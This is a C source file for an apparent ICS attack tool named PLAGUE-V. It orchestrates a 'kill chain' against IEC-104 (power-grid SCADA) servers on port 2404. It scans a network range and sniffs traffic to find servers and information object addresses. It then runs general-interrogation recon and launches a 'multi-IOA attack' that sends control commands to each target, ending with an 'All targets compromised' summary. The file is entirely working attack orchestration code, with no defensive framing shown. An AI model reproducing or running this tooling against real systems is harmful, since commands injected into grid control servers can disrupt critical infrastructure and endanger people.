/*
 * plague_v_orchestrator.c
 *
 * Chains the full PLAGUE-V attack pipeline:
 *   1. plague_v_netscan  — Discover IEC-104 servers + sniff IOAs (Work in progress)
 *   2. plague_v_recon    — GI for each discovered server
 *   3. plague_v_multi    — Attack each server with discovered IOAs
 *
 * Usage: ./plague_v_orchestrator --range 10.10.10.0/24 --interface eth0
 */

#include "netscan_types.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <sys/wait.h>
#include <time.h>


#define DEFAULT_SNIFF_DUR   "60"
#define DEFAULT_OUTPUT_DIR  "config"
#define DEFAULT_PORT_STR    "2404"

/* ─── Subprocess result tracking, since we're calling executables ─── */
typedef struct {
    char    ip[IP_STR_MAX];
    int     netscan_exit;
    int     recon_exit;
    int     attack_exit;
    int     ioas_discovered;
    int     commands_accepted;
    int     commands_rejected;
} TargetResult;

typedef struct {
    TargetResult *entries;
    int           count;
    int           capacity;
} ResultTracker;

static void
tracker_init(ResultTracker *rt)
{
    rt->entries  = malloc(sizeof(TargetResult) * 16);
    rt->count    = 0;
    rt->capacity = (rt->entries != NULL) ? 16 : 0;
}

static void
tracker_add(ResultTracker *rt, TargetResult r)
{
    if (rt->count >= rt->capacity) {
        int new_cap = rt->capacity * 2;
        TargetResult *tmp = realloc(rt->entries, sizeof(TargetResult) * new_cap);
        if (!tmp) return;
        rt->entries  = tmp;
        rt->capacity = new_cap;
    }
    rt->entries[rt->count++] = r;
}

static void
tracker_free(ResultTracker *rt)
{
    free(rt->entries);
    rt->entries  = NULL;
    rt->count    = 0;
    rt->capacity = 0;
}

/* ────────────────────────────────────────────────────
 *  Subprocess Execution
 * ──────────────────────────────────────────────────── */

static int
run_subprocess(const char *prog, char *const argv[], bool dry_run)
{
    /* Print the command */
    printf("  $ ");
    for (int i = 0; argv[i] != NULL; i++)
        printf("%s ", argv[i]);
    printf("\n");

    if (dry_run) return 0;

    printf("  ────────────────────────────────────────\n");

    /* DEBUG: Flush all output before fork to prevent parent's buffered
     * stdout from being duplicated in the child process */ 
    fflush(stdout);
    fflush(stderr);

    pid_t pid = fork();
    if (pid < 0) {
        perror("  [!] fork failed");
        return -1;
    }

    if (pid == 0) {
        /* Child process */
        execvp(prog, argv);
        perror("  [!] exec failed");
        _exit(127);
    }

    int status;
    waitpid(pid, &status, 0);

    printf("  ────────────────────────────────────────\n");

    if (WIFEXITED(status))
        return WEXITSTATUS(status);
    else
        return -1;
}

/* ────────────────────────────────────────────────────
 *  Parse netscan output to find confirmed servers
 * ──────────────────────────────────────────────────── */

static int
parse_scan_results(const char *filepath, char ips[][IP_STR_MAX], int max_ips)
{
    FILE *f = fopen(filepath, "r");
    if (!f) return 0;

    char line[256];
    int count = 0;

    while (fgets(line, sizeof(line), f) && count < max_ips) {
        /* Skip comments and empty lines */
        if (line[0] == '#' || line[0] == '\n') continue;

        char ip[IP_STR_MAX];
        int port, is104;

        if (sscanf(line, "%45s %d %d", ip, &port, &is104) >= 3) {
            if (is104) {
                strncpy(ips[count], ip, IP_STR_MAX - 1);
                ips[count][IP_STR_MAX - 1] = '\0';
                count++;
            }
        }
    }

    fclose(f);
    return count;
}

/* ────────────────────────────────────────────────────
 *  Pipeline Steps
 * ──────────────────────────────────────────────────── */

static int
step_netscan(const char *range, const char *iface, const char *port_str,
             const char *sniff_dur, const char *output, bool dry_run)
{
    printf("\n╔══════════════════════════════════════════╗\n");
    printf("║  Step 1: Network Reconnaissance          ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");

    /* Build argv based on what options are provided */
    const char *argv[16];
    int argc = 0;

    argv[argc++] = "./plague_v_netscan";
    if (range) {
        argv[argc++] = "--scan";
        argv[argc++] = range;
    }
    argv[argc++] = "--port";
    argv[argc++] = port_str;
    if (iface) {
        argv[argc++] = "--sniff";
        argv[argc++] = iface;
        argv[argc++] = "--sniff-duration";
        argv[argc++] = sniff_dur;
    }
    if (!iface && range) {
        argv[argc++] = "--scan-only";
    }
    argv[argc++] = "--output";
    argv[argc++] = output;
    argv[argc] = NULL;

    return run_subprocess("./plague_v_netscan", (char *const *)argv, dry_run);
}

static int
step_recon(const char *ip, const char *port_str, const char *output, bool dry_run)
{
    printf("\n[*] Running GI reconnaissance against %s ...\n", ip);

    char *argv[] = {
        "./plague_v_recon",
        (char *)ip,
        (char *)port_str,
        (char *)output,
        NULL
    };

    return run_subprocess("./plague_v_recon", argv, dry_run);
}

static int
step_attack(const char *ip, const char *port_str, const char *config, bool dry_run)
{
    printf("\n[*] Executing attack against %s ...\n", ip);

    char *argv[] = {
        "./plague_v_multi",
        (char *)ip,
        (char *)port_str,
        (char *)config,
        NULL
    };

    return run_subprocess("./plague_v_multi", argv, dry_run);
}

/* ────────────────────────────────────────────────────
 *  Summary
 * ──────────────────────────────────────────────────── */

static void
print_summary(const ResultTracker *rt, double elapsed_sec)
{
    printf("\n╔══════════════════════════════════════════════════════════╗\n");
    printf("║              PLAGUE-V ORCHESTRATOR SUMMARY              ║\n");
    printf("╠══════════════════════════════════════════════════════════╣\n");
    printf("║  Total elapsed : %-6.1fs                                ║\n", elapsed_sec);
    printf("║  Targets hit   : %-3d                                    ║\n", rt->count);
    printf("╠════════════════════╦═══════╦════════╦═════════╦═════════╣\n");
    printf("║       Target       ║ Recon ║ Attack ║ Accepted║ Rejected║\n");
    printf("╠════════════════════╬═══════╬════════╬═════════╬═════════╣\n");

    for (int i = 0; i < rt->count; i++) {
        const TargetResult *r = &rt->entries[i];
        const char *recon_status  = (r->recon_exit == 0) ? "OK" : "FAIL";
        const char *attack_status;
        if (r->attack_exit == 0)      attack_status = "OK";
        else if (r->attack_exit == 2) attack_status = "PARTIAL";
        else                          attack_status = "FAIL";

        printf("║ %-18s ║ %-5s ║ %-6s ║ %-7d ║ %-7d ║\n",
               r->ip, recon_status, attack_status,
               r->commands_accepted, r->commands_rejected);
    }

    printf("╚════════════════════╩═══════╩════════╩═════════╩═════════╝\n");
}

/* ────────────────────────────────────────────────────
 *  CLI + Main
 * ──────────────────────────────────────────────────── */

static void
print_usage(const char *prog)
{
    printf("Usage: %s [options]\n\n", prog);
    printf("Options:\n");
    printf("  --range <cidr>          Target network (e.g. 10.10.10.0/24)\n");
    printf("  --port <port>           Target port (default: 2404)\n");
    printf("  --interface <iface>     Interface for passive sniffing (e.g. eth0)\n");
    printf("  --sniff-duration <sec>  Passive sniff duration (default: 60)\n");
    printf("  --config <path>         Skip netscan, use existing target config\n");
    printf("  --output-dir <dir>      Directory for configs (default: config/)\n");
    printf("  --dry-run               Show plan without executing\n");
    printf("  --skip-recon            Skip M3 recon, go straight to M2 attack\n");
    printf("  --help                  Show this help\n");
    printf("\nExamples:\n");
    printf("  %s --range 10.10.10.0/24 --interface eth0\n", prog);
    printf("  %s --range 10.10.10.10/32\n", prog);
    printf("  %s --config config/netscan_targets.txt --skip-recon\n", prog);
    printf("  %s --range 10.10.10.0/24 --dry-run\n", prog);
}

int
main(int argc, char **argv)
{
    const char *range       = NULL;
    const char *iface       = NULL;
    const char *config_path = NULL;
    const char *output_dir  = DEFAULT_OUTPUT_DIR;
    const char *port_str    = DEFAULT_PORT_STR;
    char sniff_dur[16];
    strncpy(sniff_dur, DEFAULT_SNIFF_DUR, sizeof(sniff_dur));
    bool dry_run    = false;
    bool skip_recon = false;

    static struct option long_opts[] = {
        { "range",          required_argument, NULL, 'r' },
        { "port",           required_argument, NULL, 'p' },
        { "interface",      required_argument, NULL, 'i' },
        { "sniff-duration", required_argument, NULL, 'd' },
        { "config",         required_argument, NULL, 'c' },
        { "output-dir",     required_argument, NULL, 'o' },
        { "dry-run",        no_argument,       NULL, 'D' },
        { "skip-recon",     no_argument,       NULL, 'S' },
        { "help",           no_argument,       NULL, 'h' },
        { NULL, 0, NULL, 0 }
    };

    int opt;
    while ((opt = getopt_long(argc, argv, "r:p:i:d:c:o:DSh", long_opts, NULL)) != -1) {
        switch (opt) {
        case 'r': range       = optarg; break;
        case 'p': port_str    = optarg; break;
        case 'i': iface       = optarg; break;
        case 'd': strncpy(sniff_dur, optarg, sizeof(sniff_dur) - 1); break;
        case 'c': config_path = optarg; break;
        case 'o': output_dir  = optarg; break;
        case 'D': dry_run     = true; break;
        case 'S': skip_recon  = true; break;
        case 'h':
            print_usage(argv[0]);
            return 0;
        default:
            print_usage(argv[0]);
            return 1;
        }
    }

    if (!range && !config_path) {
        fprintf(stderr, "[!] Must specify --range or --config\n\n");
        print_usage(argv[0]);
        return 1;
    }

    /* When --config + --skip-recon: config is an IOA map, not netscan output.
     * Need --range to know which server to attack. */
    bool direct_attack = (config_path != NULL && skip_recon);
    if (direct_attack && !range) {
        fprintf(stderr, "[!] --config with --skip-recon requires --range to specify target IP\n");
        fprintf(stderr, "    Example: --range 10.10.10.10/32 --config config/target_ioa_map.txt --skip-recon\n\n");
        return 1;
    }

    printf("╔══════════════════════════════════════════╗\n");
    printf("║   PLAGUE-V — Kill Chain Orchestrator     ║\n");
    printf("╚══════════════════════════════════════════╝\n");

    if (range)       printf("[*] Target range : %s\n", range);
    if (config_path) printf("[*] Config file  : %s\n", config_path);
    if (iface)       printf("[*] Sniff iface  : %s (%ss)\n", iface, sniff_dur);
    printf("[*] Port         : %s\n", port_str);
    printf("[*] Output dir   : %s\n", output_dir);
    if (dry_run)     printf("[*] Mode         : DRY RUN (no execution)\n");
    if (skip_recon)  printf("[*] Skipping     : M3 recon\n");
    if (direct_attack) printf("[*] Mode         : Direct attack (IOA map → M2)\n");
    printf("\n");

    struct timespec t_start, t_end;
    clock_gettime(CLOCK_MONOTONIC, &t_start);

    ResultTracker tracker;
    tracker_init(&tracker);

    /* ── Build paths ── */
    char netscan_output[256];
    snprintf(netscan_output, sizeof(netscan_output), "%s/netscan_targets.txt", output_dir);

    /* ════════════════════════════════════════════════
     *  Direct attack mode: skip netscan + recon, use config as IOA map
     * ════════════════════════════════════════════════ */
    if (direct_attack) {
        /* Extract IP from --range (strip /prefix) */
        char target_ip[IP_STR_MAX];
        strncpy(target_ip, range, IP_STR_MAX - 1);
        target_ip[IP_STR_MAX - 1] = '\0';
        char *slash = strchr(target_ip, '/');
        if (slash) *slash = '\0';

        printf("[*] Direct attack: %s with IOA map %s\n", target_ip, config_path);

        TargetResult result;
        memset(&result, 0, sizeof(result));
        strncpy(result.ip, target_ip, IP_STR_MAX - 1);

        printf("\n╔══════════════════════════════════════════╗\n");
        printf("║  Target 1/1: %-25s  ║\n", target_ip);
        printf("╚══════════════════════════════════════════╝\n");

        printf("\n  Step 2: Skipped (direct attack mode)\n");
        result.recon_exit = 0;

        printf("\n  Step 3: Multi-IOA Attack (M2)\n");
        result.attack_exit = step_attack(target_ip, port_str,
                                         config_path, dry_run);

        tracker_add(&tracker, result);

        goto summary;
    }

    /* ════════════════════════════════════════════════
     *  Step 1: Netscan (or load existing netscan config)
     * ════════════════════════════════════════════════ */
    if (config_path) {
        printf("[*] Using existing netscan config: %s\n", config_path);
        strncpy(netscan_output, config_path, sizeof(netscan_output) - 1);
    } else {
        int ret = step_netscan(range, iface, port_str, sniff_dur,
                               netscan_output, dry_run);
        if (ret != 0 && !dry_run) {
            fprintf(stderr, "\n[!] Netscan failed (exit %d) — aborting\n", ret);
            tracker_free(&tracker);
            return 1;
        }
    }

    /* ════════════════════════════════════════════════
     *  Parse discovered servers
     * ════════════════════════════════════════════════ */
    char discovered_ips[256][IP_STR_MAX];
    int server_count = 0;

    if (!dry_run) {
        server_count = parse_scan_results(netscan_output, discovered_ips, 256);
        printf("\n[*] Found %d IEC-104 server(s) to target\n", server_count);

        if (server_count == 0) {
            printf("[*] No servers found — nothing to attack\n");
            tracker_free(&tracker);
            return 1;
        }
    } else {
        /* In dry-run, simulate finding targets */
        printf("\n[*] (dry-run) Would parse %s for discovered servers\n", netscan_output);
        server_count = 1;
        strncpy(discovered_ips[0], "<scan-result>", IP_STR_MAX);
    }

    /* ════════════════════════════════════════════════
     *  Step 2 + 3: Per-server recon + attack
     * ════════════════════════════════════════════════ */
    for (int i = 0; i < server_count; i++) {
        const char *ip = discovered_ips[i];

        printf("\n╔══════════════════════════════════════════╗\n");
        printf("║  Target %d/%d: %-25s  ║\n", i + 1, server_count, ip);
        printf("╚══════════════════════════════════════════╝\n");

        TargetResult result;
        memset(&result, 0, sizeof(result));
        strncpy(result.ip, ip, IP_STR_MAX - 1);

        /* Build per-target config path — sanitize IP dots only */
        char safe_ip[IP_STR_MAX];
        strncpy(safe_ip, ip, IP_STR_MAX - 1);
        safe_ip[IP_STR_MAX - 1] = '\0';
        for (char *p = safe_ip; *p; p++) {
            if (*p == '.') *p = '_';
        }

        char recon_output[256];
        snprintf(recon_output, sizeof(recon_output),
                 "%s/discovered_%s.txt", output_dir, safe_ip);

        /* ── Step 2: M3 Recon ── */
        if (!skip_recon) {
            printf("\n  Step 2: General Interrogation (M3)\n");
            result.recon_exit = step_recon(ip, port_str, recon_output, dry_run);
        } else {
            printf("\n  Step 2: Skipped (--skip-recon)\n");
            result.recon_exit = 0;
            /* Use the netscan output directly for M2 */
            strncpy(recon_output, netscan_output, sizeof(recon_output) - 1);
        }

        /* ── Step 3: M2 Attack ── */
        printf("\n  Step 3: Multi-IOA Attack (M2)\n");
        result.attack_exit = step_attack(ip, port_str, recon_output, dry_run);

        /* Record results */
        tracker_add(&tracker, result);
    }

summary:
    /* ════════════════════════════════════════════════
     *  Final Summary
     * ════════════════════════════════════════════════ */
    clock_gettime(CLOCK_MONOTONIC, &t_end);
    double elapsed = (t_end.tv_sec - t_start.tv_sec) +
                     (t_end.tv_nsec - t_start.tv_nsec) / 1e9;

    print_summary(&tracker, elapsed);

    /* ── Determine exit code ── */
    int exit_code = 0;
    bool any_success = false;
    bool any_failure = false;

    for (int i = 0; i < tracker.count; i++) {
        int ae = tracker.entries[i].attack_exit;
        if (ae == 0)
            any_success = true;
        else if (ae == 2)   /* PARTIAL = some commands accepted */
            any_success = true, any_failure = true;
        else
            any_failure = true;
    }

    if (any_success && !any_failure)
        printf("\n[✓] All targets compromised\n");
    else if (any_success)
        printf("\n[~] Partial success\n");
    else if (dry_run)
        printf("\n[*] Dry run complete — no commands executed\n");
    else {
        printf("\n[✗] All targets failed\n");
        exit_code = 1;
    }

    tracker_free(&tracker);
    return exit_code;
}
